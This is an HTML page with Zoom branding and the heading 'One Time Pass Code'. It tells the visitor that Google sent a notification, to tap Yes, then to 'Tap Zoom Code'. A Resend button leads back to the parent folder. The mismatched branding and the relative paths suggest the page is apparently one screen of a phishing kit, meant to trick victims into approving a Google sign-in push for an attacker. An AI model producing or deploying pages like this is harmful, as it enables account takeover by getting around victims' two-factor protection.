<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
  />

  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
    }

    html,
    body {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      color: #202124;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    /* Main container */
    .container {
      width: 100%;
      height: 100vh;
      max-width: 420px;

      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;

      text-align: center;

      padding: 3vh 6vw 3.5vh 6vw;
      background: #ffffff;
    }

    /* Content */
    .content-box {
      width: 100%;

      display: flex;
      flex-direction: column;
      align-items: center;

      margin-top: 1vh;
    }

    /* Zoom Logo */
    .logo {
      width: clamp(45px, 12vw, 52px);
      height: auto;
      object-fit: contain;

      margin-bottom: 1.5vh;
      border-radius: 50%;
    }

    /* Main Title */
    h1 {
      font-size: clamp(18px, 4.5vw, 22px);
      font-weight: 700;
      color: #1a1a1a;

      margin-bottom: 1.5vh;
    }

    /*
      PHONE ILLUSTRATION
      -------------------
      Responsive + Bigger
    */
    .phone-illustration {
      width: clamp(155px, 52vw, 220px);
      max-width: 220px;
      height: auto;

      display: block;
      object-fit: contain;

      margin-top: 0.5vh;
      margin-bottom: 1.8vh;
    }

    /* Sub Heading */
    h2 {
      font-size: clamp(16px, 4vw, 19px);
      font-weight: 700;
      color: #1a1a1a;

      margin-bottom: 1vh;
    }

    /* Description */
    .desc-text {
      font-size: clamp(13.5px, 3.5vw, 15px);
      font-weight: 600;

      color: #1f2937;
      line-height: 1.4;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button */
    .btn-join {
      background-color: #007aff;
      color: white;

      padding: 14px 0;

      width: 100%;
      max-width: 330px;

      font-size: 16px;
      font-weight: bold;

      border: none;
      border-radius: 12px;

      cursor: pointer;

      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);

      transition:
        background-color 0.2s,
        transform 0.1s;

      margin-bottom: 1vh;
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }

    /*
      Extra responsive adjustment
      for very small phones
    */
    @media (max-height: 650px) {
      .container {
        padding-top: 2vh;
        padding-bottom: 2vh;
      }

      .phone-illustration {
        width: clamp(135px, 43vw, 180px);
        margin-bottom: 1vh;
      }

      h1 {
        margin-bottom: 1vh;
      }
    }

    /*
      Bigger phones / taller screens
    */
    @media (min-height: 750px) {
      .phone-illustration {
        width: clamp(175px, 55vw, 230px);
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="content-box">

      <!-- Zoom Logo -->
      <img
        class="logo"
        src="../../Zoom-Logo.png"
        alt="Zoom Logo"
      />

      <!-- Title -->
      <h1>One Time Pass Code</h1>

      <!-- Bigger Responsive Phone -->
      <img
        class="phone-illustration"
        src="../icon.gif"
        alt="Phone Illustration"
      />

      <!-- Heading -->
      <h2>Check your phone.</h2>

      <!-- Description -->
      <p class="desc-text">
        Google sent a notification to your phone.<br />
        <span>Tap Yes</span> on the notification<br />
        Then Tap Zoom Code
      </p>

    </div>

    <!-- Resend -->
    <button
      class="btn-join"
      onclick="window.location.href='../'"
    >
      Resend
    </button>

  </div>

</body>
</html>
